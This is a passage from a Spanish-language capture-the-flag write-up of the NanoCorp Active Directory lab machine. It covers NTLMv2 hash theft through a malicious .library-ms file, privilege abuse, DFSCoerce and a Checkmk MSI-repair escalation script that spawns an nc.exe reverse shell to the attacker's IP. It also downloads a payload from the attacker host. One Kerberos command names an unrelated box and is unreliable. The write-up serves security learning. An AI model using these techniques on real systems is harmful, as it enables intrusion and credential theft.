+</span></span><span class="line"><span class="cl">5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc01.nanocorp.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:dc01.nanocorp.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2025-04-06T22:58:43
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2026-04-06T23:18:43
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-alpn:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl">6556/tcp  open  check_mk          check_mk extension <span class="k">for</span> Nagios 2.1.0p10
+</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf            .NET Message Framing
+</span></span><span class="line"><span class="cl">49664/tcp open  msrpc             Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49668/tcp open  msrpc             Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49671/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">63947/tcp open  msrpc             Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">63955/tcp open  msrpc             Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">63977/tcp open  msrpc             Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">Service Info: Hosts: nanocorp.htb, DC01<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   311:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: 6h59m04s, deviation: 0s, median: 6h59m03s
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2025-11-09T04:35:28
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 107.71 seconds
+</span></span></code></pre></div><h1 id="enumeración-web">Enumeración web<a hidden class="anchor" aria-hidden="true" href="#enumeración-web">#</a></h1>
+<p>En el escaneo con nmap vemos que tenemos el puerto web expuesto, entonces lo primero que hacemos es tratar de enumerarlo para buscar posibles vectores de ataque.</p>
+<p>Cuando empezamos a enumerar la web en una de las funcionalidades vemos que existe un subdominio llamado <code>hire</code>.</p>
+<p><img alt="nanocorp_machine_1" loading="lazy" src="/img/nanocorp/nanocorp_machine_1.png"></p>
+<p>Entonces lo añadimos al /etc/hosts y entramos para ver que se trata. Vemos que tenemos un panel en el cual podemos subir un zip junto con nuestra información para intentar formar parte de su equipo.</p>
+<p><img alt="nanocorp_machine_2" loading="lazy" src="/img/nanocorp/nanocorp_machine_2.png"></p>
+<p>En un principio intento realizar subida de archivos php para conseguir una shell en la máquina pero no consigo que me funcione, también intento realizar un Zip Slip aunque tampoco tengo éxito.</p>
+<p>Durante el proceso vemos que la propia aplicación al subir el archivo, nos comenta que el zip es descomprimido.</p>
+<p><img alt="nanocorp_machine_3" loading="lazy" src="/img/nanocorp/nanocorp_machine_3.png"></p>
+<p>El siguiente paso que doy es entonces intentar realizar un spoofing para robar las credenciales creando una librería maliciosa que apunte a mi servidor smb para recibir los hashes NTLMv2.</p>
+<h2 id="robo-de-hash-ntlmv2---library-ms">Robo de hash NTLMv2 - .library-ms<a hidden class="anchor" aria-hidden="true" href="#robo-de-hash-ntlmv2---library-ms">#</a></h2>
+<p>Primero necesitamos crear la librería maliciosa (.library-ms) la cual tiene una url apuntando a nuestro servidor smb.</p>
+<p><img alt="nanocorp_machine_4" loading="lazy" src="/img/nanocorp/nanocorp_machine_4.png"></p>
+<p>Una vez con el archivo lo enviamos al zip con el siguiente comando:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">zip malicius.zip .library-ms
+</span></span></code></pre></div><p>Ahora creamos nuestro propio servidor smb son <code>smbserver.py</code> y subimos el zip malicioso y al momento veremos como recibimos los hash NTLMv2 de <code>web_svc</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">smbserver.py smbFolder <span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span> -smb2support
+</span></span></code></pre></div><p><img alt="nanocorp_machine_5" loading="lazy" src="/img/nanocorp/nanocorp_machine_5.png"></p>
+<p>Y usando hashcat creackeamos el hash:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hashcat -m <span class="m">5600</span> --force -a <span class="m">0</span> coercer_hash.txt /usr/share/seclists/Passwords/Leaked-Database/rockyou.txt
+</span></span></code></pre></div><p><img alt="nanocorp_machine_6" loading="lazy" src="/img/nanocorp/nanocorp_machine_6.png"></p>
+<p><code>WEB_SVC:dksehdgh712!@#</code> Comprobación de credenciales:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb dc01.nanocorp.htb -u <span class="s1">&#39;web_svc&#39;</span> -p <span class="s1">&#39;dksehdgh712!@#&#39;</span>
+</span></span></code></pre></div><p><img alt="nanocorp_machine_7" loading="lazy" src="/img/nanocorp/nanocorp_machine_7.png"></p>
+<h1 id="bloodhound-enumeration">Bloodhound Enumeration<a hidden class="anchor" aria-hidden="true" href="#bloodhound-enumeration">#</a></h1>
+<p>Una vez con las credenciales el siguiente paso que doy es lanzar un escaneo con <code>python-bloodhound</code> y si no veo nada interesante procederé a enumerar carpetas compartidas y usuarios.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodhound-python -u <span class="s1">&#39;web_svc&#39;</span> -p <span class="s1">&#39;dksehdgh712!@#&#39;</span> -d nanocorp.htb -ns 10.129.130.136 -c all --zip
+</span></span></code></pre></div><p><img alt="nanocorp_machine_8" loading="lazy" src="/img/nanocorp/nanocorp_machine_8.png"></p>
+<p>Rápidamente vemos los permisos que nuestro usuario actual tiene sobre el grupo IT_SUPPORT el cual nos permite añadirnos a el.</p>
+<p><img alt="nanocorp_machine_9" loading="lazy" src="/img/nanocorp/nanocorp_machine_9.png"></p>
+<h2 id="abusando-de-permisos-addself---bloodyad">Abusando de permisos AddSelf - bloodyAD<a hidden class="anchor" aria-hidden="true" href="#abusando-de-permisos-addself---bloodyad">#</a></h2>
+<p>Añadimos al usuario web_svc al grupo <code>IT_SUPPORT</code> para heredar sus permisos:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD --host 10.129.130.136 -d nanocorp.htb -u <span class="s1">&#39;web_svc&#39;</span> -p <span class="s1">&#39;dksehdgh712!@#&#39;</span> add groupMember <span class="s1">&#39;IT_SUPPORT&#39;</span> <span class="s1">&#39;web_svc&#39;</span>
+</span></span></code></pre></div><p><img alt="nanocorp_machine_10" loading="lazy" src="/img/nanocorp/nanocorp_machine_10.png"></p>
+<h2 id="abusando-de-permisos-forcechangepassword----net-rpc">Abusando de permisos ForceChangePassword  - net rpc<a hidden class="anchor" aria-hidden="true" href="#abusando-de-permisos-forcechangepassword----net-rpc">#</a></h2>
+<p>Una vez añadido el usuario al grupo IT_SUPPORT si revisamos los permisos del grupo, vemos que los miembros del grupo tienen la capacidad de cambiar la contraseña al usuario <code>MONITORING_SVC</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">net rpc password <span class="s2">&#34;monitoring_svc&#34;</span> <span class="s2">&#34;Password01&#34;</span> -U <span class="s1">&#39;nanocorp.htb&#39;</span>/<span class="s1">&#39;web_svc&#39;</span>%<span class="s1">&#39;dksehdgh712!@#&#39;</span> -S 10.129.130.136
+</span></span></code></pre></div><p><img alt="nanocorp_machine_11" loading="lazy" src="/img/nanocorp/nanocorp_machine_11.png"></p>
+<h2 id="shell-as-monitoring_svc">Shell as monitoring_svc<a hidden class="anchor" aria-hidden="true" href="#shell-as-monitoring_svc">#</a></h2>
+<p>Y ahora compruebo que el cambio de contraseña haya sido efectivo, pero me da un error de que la cuenta tiene una restricción:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb dc01.nanocorp.htb -u <span class="s1">&#39;monitoring_svc&#39;</span> -p <span class="s1">&#39;Password01&#39;</span>
+</span></span></code></pre></div><p><img alt="nanocorp_machine_12" loading="lazy" src="/img/nanocorp/nanocorp_machine_12.png"></p>
+<blockquote>
+<p>[!NOTE] Porque ocurre este error?
+El usuario &ldquo;monitoring_svc&rdquo; es miembro del Grupo Protected Users, con lo cual tiene la autenticación NTLM des-habilitada. Para poder autenticar-nos con este usuario necesitaremos usar el protocolo kerberos o SSL.</p>
+</blockquote>
+<p>Para revertir este error lo que hago es autenticar-me a través de kerberos directamente:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#Nos sincronizamos con la hora del servidor</span>
+</span></span><span class="line"><span class="cl">sudo ntpdate -u 10.129.130.136
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nxc ldap dc01.nanocorp.htb -u <span class="s1">&#39;monitoring_svc&#39;</span> -p <span class="s1">&#39;Password01&#39;</span> -k
+</span></span></code></pre></div><p><img alt="nanocorp_machine_13" loading="lazy" src="/img/nanocorp/nanocorp_machine_13.png"></p>
+<p>Como ahora si que nos ha aceptado las credenciales, solicitamos el Ticket Garanting Ticket (TGT) para el usuario monitoring_svc:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">getTGT.py rustykey.htb/rr.parker:<span class="s1">&#39;8#t5HE8L!W3A&#39;</span> -dc-ip 10.10.11.75
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>monitoring_svc.ccache
+</span></span></code></pre></div><p><img alt="nanocorp_machine_14" loading="lazy" src="/img/nanocorp/nanocorp_machine_14.png"></p>
+<p>También edito el archivo krb5.conf:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#Editamos el archivo krb5.conf</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>libdefaults<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">default_realm</span> <span class="o">=</span> NANOCORP.HTB
+</span></span><span class="line"><span class="cl">    <span class="nv">ticket_lifetime</span> <span class="o">=</span> 24h
+</span></span><span class="line"><span class="cl">    <span class="nv">renew_lifetime</span> <span class="o">=</span> 7d
+</span></span><span class="line"><span class="cl">    <span class="nv">forwardable</span> <span class="o">=</span> <span class="nb">true</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">rdns</span> <span class="o">=</span> <span class="nb">false</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>realms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    NANOCORP.HTB <span class="o">=</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">kdc</span> <span class="o">=</span> DC01.nanocorp.htb
+</span></span><span class="line"><span class="cl">        <span class="nv">admin_server</span> <span class="o">=</span> DC01.nanocorp.htb
+</span></span><span class="line"><span class="cl">        <span class="nv">default_domain</span> <span class="o">=</span> nanocorp.htb
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>domain_realm<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    .nanocorp.htb <span class="o">=</span> NANOCORP.HTB
+</span></span><span class="line"><span class="cl">    nanocorp.htb <span class="o">=</span> NANOCORP.HTB
+</span></span></code></pre></div><p>Una vez con todo esto pruebo a autenticar-me con evil-winrm o a través de SSL pero tengo dificultades para poder autenticar-me aun probando diferentes opciones.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">evil-winrm -u <span class="s1">&#39;monitoring_svc&#39;</span> -p <span class="s1">&#39;Password01!&#39;</span> -i 10.129.213.184 -S
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">evil-winrm -r nanocorp.htb -i DC01.nanocorp.htb -p <span class="m">5986</span>
+</span></span></code></pre></div><p><img alt="nanocorp_machine_15" loading="lazy" src="/img/nanocorp/nanocorp_machine_15.png"></p>
+<p><img alt="nanocorp_machine_16" loading="lazy" src="/img/nanocorp/nanocorp_machine_16.png"></p>
+<p>La solución que encontré es a usar <code>evil-winrm-py</code> que es una herramienta para ejecutar comandos  en máquinas Windows a través de WinRM.</p>
+<p><a href="https://github.com/adityatelange/evil-winrm-py">Evil-winrm-py</a></p>
+<blockquote>
+<p>[!NOTE] Kerberos + SSL
+Para conseguir autenticar-nos tenemos que usar <code>kerberos</code> porque la autenticación NTLM esta des-habilitada tal como habiamos comentado anteriormente, además tenemos que indicar que es a través de <code>ssl</code> ya que el puerto winRM abierto es el <code>5986</code>.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#En el comando ejecutado indico el puerto abierto, pero al indicar la opción --SSL la herramienta ya coge automaticamente el puerto ssl.</span>
+</span></span><span class="line"><span class="cl">evil-winrm-py -i dc01.nanocorp.htb -k --port <span class="m">5986</span> --ssl --no-pass
+</span></span></code></pre></div><p><img alt="nanocorp_machine_17" loading="lazy" src="/img/nanocorp/nanocorp_machine_17.png"></p>
+<p>Una vez hecho todo esto ya tenemos la shell como monitoring_svc además de la user flag.</p>
+<h1 id="escalada-de-privilegios">Escalada de privilegios<a hidden class="anchor" aria-hidden="true" href="#escalada-de-privilegios">#</a></h1>
+<p>Si miramos los permisos de monitoring_svc en bloodhound, no vemos ninguna manera de poder seguir aumentando nuestros privilegios, con lo cual trataremos de enumerar el sistema mediante la shell que acabamos de obtener.</p>
+<h2 id="enumeración-del-sistema---winpeas--failed">Enumeración del sistema - WinPeas / FAILED<a hidden class="anchor" aria-hidden="true" href="#enumeración-del-sistema---winpeas--failed">#</a></h2>
+<p><a href="https://github.com/peass-ng">Repositorio Peass-ng</a></p>
+<p>Usando la herramienta que nos proporciona evil-winrm, nos subimos nuestro WinPEAS para realizar un escaneo del sistema:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">upload</span> <span class="n">winPEASx64</span><span class="p">.</span><span class="py">exe</span> <span class="p">.\</span><span class="n">winPEASx64</span><span class="p">.</span><span class="py">exe</span>
+</span></span></code></pre></div><h2 id="coerce-vulnerability---dfscoerce--failed">Coerce Vulnerability - DFSCoerce / FAILED<a hidden class="anchor" aria-hidden="true" href="#coerce-vulnerability---dfscoerce--failed">#</a></h2>
+<p><a href="https://swisskyrepo.github.io/InternalAllTheThings/active-directory/internal-relay-coerce/">Internal Relay Coerce</a></p>
+<p>Luego de revisar la salida tampoco encuentro nada que me de una pista de por donde seguir, entonces pruebo a revisar si el servidor es vulnerable a algún tipo de coercer:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb dc01.nanocorp.htb --use-kcache -M coerce_plus
+</span></span></code></pre></div><p><img alt="nanocorp_machine_18" loading="lazy" src="/img/nanocorp/nanocorp_machine_18.png"></p>
+<p>Viendo que tenemos varias vulnerabilidades potenciales, pruebo a realizar el DFSCoerce.</p>
+<p>Para conseguir realizar el ataque me descargo esta herramienta de este repositorio <a href="https://github.com/Wh04m1001/DFSCoerce">DFS Coerce Python</a></p>
+<p>Una vez con ella descargada, pongo en marcha mi responder para recibir el hash del dominio que se autenticará contra mi y configuro los parámetros de la herramienta.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">responder -I tun0 -w
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">python3 dfscoerce.py -u <span class="s1">&#39;monitoring_svc&#39;</span> -k -no-pass -d nanocorp.htb 10.10.15.142 dc01.nanocorp.htb
+</span></span></code></pre></div><p><img alt="nanocorp_machine_19" loading="lazy" src="/img/nanocorp/nanocorp_machine_19.png"></p>
+<p><img alt="nanocorp_machine_20" loading="lazy" src="/img/nanocorp/nanocorp_machine_20.png"></p>
+<p>Una vez ejecutada la herramienta vemos que hemos conseguido el hash NTLMv2 de DC01, pero cuando intento crackear-lo no consigo obtener la contraseña(Exhausted).</p>
+<h2 id="msi-repair">MSI Repair<a hidden class="anchor" aria-hidden="true" href="#msi-repair">#</a></h2>
+<p><img alt="nanocorp_machine_21" loading="lazy" src="/img/nanocorp/nanocorp_machine_21.png"></p>
+<p>(He movido el archivo nc.exe a C:\Windows\Temp)</p>
+<p>Script malicioso en powershell:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="k">param</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="no">int</span><span class="p">]</span><span class="nv">$MinPID</span> <span class="p">=</span> <span class="mf">1000</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="no">int</span><span class="p">]</span><span class="nv">$MaxPID</span> <span class="p">=</span> <span class="mf">15000</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="no">string</span><span class="p">]</span><span class="nv">$LHOST</span> <span class="p">=</span> <span class="s2">&#34;10.10.15.142&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="no">string</span><span class="p">]</span><span class="nv">$LPORT</span> <span class="p">=</span> <span class="s2">&#34;4444&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># 1. Define the malicious batch payload</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$NcPath</span> <span class="p">=</span> <span class="s2">&#34;C:\Windows\Temp\nc.exe&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$BatchPayload</span> <span class="p">=</span> <span class="s2">&#34;@echo off</span><span class="se">`r`n</span><span class="nv">$NcPath</span><span class="s2"> -e cmd.exe </span><span class="nv">$LHOST</span><span class="s2"> </span><span class="nv">$LPORT</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># 2. Find the MSI trigger</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$msi</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Get-ItemProperty</span> <span class="s1">&#39;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties&#39;</span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="py">DisplayName</span> <span class="o">-like</span> <span class="s1">&#39;*mk*&#39;</span> <span class="p">}</span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nb">Select-Object</span> <span class="n">-First</span> <span class="mf">1</span><span class="p">).</span><span class="py">LocalPackage</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(!</span><span class="nv">$msi</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">Write-Error</span> <span class="s2">&#34;Could not find Checkmk MSI&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">Write-Host</span> <span class="s2">&#34;[*] Found MSI at </span><span class="nv">$msi</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># 3. Spray the Read-Only files</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">Write-Host</span> <span class="s2">&#34;[*] Seeding </span><span class="nv">$MinPID</span><span class="s2"> to </span><span class="nv">$MaxPID</span><span class="s2">...&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span> <span class="p">(</span><span class="nv">$ctr</span> <span class="k">in</span> <span class="mf">0</span><span class="p">.</span><span class="mf">.1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$num</span> <span class="p">=</span> <span class="nv">$MinPID</span><span class="p">;</span> <span class="nv">$num</span> <span class="o">-le</span> <span class="nv">$MaxPID</span><span class="p">;</span> <span class="nv">$num</span><span class="p">++)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$filePath</span> <span class="p">=</span> <span class="s2">&#34;C:\Windows\Temp\cmk_all_</span><span class="p">$(</span><span class="nv">$num</span><span class="p">)</span><span class="s2">_</span><span class="p">$(</span><span class="nv">$ctr</span><span class="p">)</span><span class="s2">.cmd&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="p">[</span><span class="no">System.IO.File</span><span class="p">]::</span><span class="n">WriteAllText</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">,</span> <span class="nv">$BatchPayload</span><span class="p">,</span> <span class="p">[</span><span class="no">System.Text.Encoding</span><span class="p">]::</span><span class="n">ASCII</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="nb">Set-ItemProperty</span> <span class="n">-Path</span> <span class="nv">$filePath</span> <span class="n">-Name</span> <span class="n">IsReadOnly</span> <span class="n">-Value</span> <span class="vm">$true</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c"># 123</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">Write-Host</span> <span class="s2">&#34;[*] Seeding complete.&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># 4. Launch the trigger</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">Write-Host</span> <span class="s2">&#34;[*] Triggering MSI repair...&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">Start-Process</span> <span class="s2">&#34;msiexec.exe&#34;</span> <span class="n">-ArgumentList</span> <span class="s2">&#34;/fa </span><span class="se">`&#34;</span><span class="nv">$msi</span><span class="se">`&#34;</span><span class="s2"> /qn /l*vx C:\Windows\Temp\cmk_repair.log&#34;</span> <span class="n">-Wait</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">Write-Host</span> <span class="s2">&#34;[*] Trigger sent. Check listener.&#34;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">10.10</span><span class="p">.</span><span class="py">15</span><span class="p">.</span><span class="mf">142</span><span class="err">:</span><span class="mf">8081</span><span class="p">/</span><span class="n">bad</span><span class="p">.</span><span class="py">ps1</span> <span class="n">-OutFile</span> <span class="n">sc</span><span class="p">.</span><span class="py">ps1</span>
+</span></span></code></pre></div><p><img alt="nanocorp_machine_22" loading="lazy" src="/img/nanocorp/nanocorp_machine_22.png"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">RunasCs</span><span class="p">.</span><span class="py">exe</span> <span class="n">web_svc</span> <span class="err">“</span><span class="n">dksehdgh712</span><span class="p">!@</span><span class="c">#” “C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\W</span>
+</span></span><span class="line"><span class="cl"><span class="n">indows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">sc</span><span class="p">.</span><span class="n">ps1</span><span class="err">”</span>
+</span></span></code></pre></div><p><img alt="nanocorp_machine_23" loading="lazy" src="/img/nanocorp/nanocorp_machine_23.png"></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://borhuub.github.io/tags/hard/">Hard</a></li>
+      <li><a href="https://borhuub.github.io/tags/activedirectory/">ActiveDirectory</a></li>
+      <li><a href="https://borhuub.github.io/tags/hash-stealer/">Hash-Stealer</a></li>
+      <li><a href="https://borhuub.github.io/tags/addself/">AddSelf</a></li>
+      <li><a href="https://borhuub.github.io/tags/forcechangepassword/">ForceChangePassword</a></li>
+      <li><a href="https://borhuub.github.io/tags/winpeas/">WinPEAS</a></li>
+      <li><a href="https://borhuub.github.io/tags/dfscoerce/">DFSCoerce</a></li>
+      <li><a href="https://borhuub.github.io/tags/msi-repair/">MSI-Repair</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://borhuub.github.io/writeups/linkvortex/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>Linkvortex</span>
+  </a>
+  <a class="next" href="https://borhuub.github.io/writeups/nocturnal/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Nocutrnal</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://borhuub.github.io/">Borhub Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
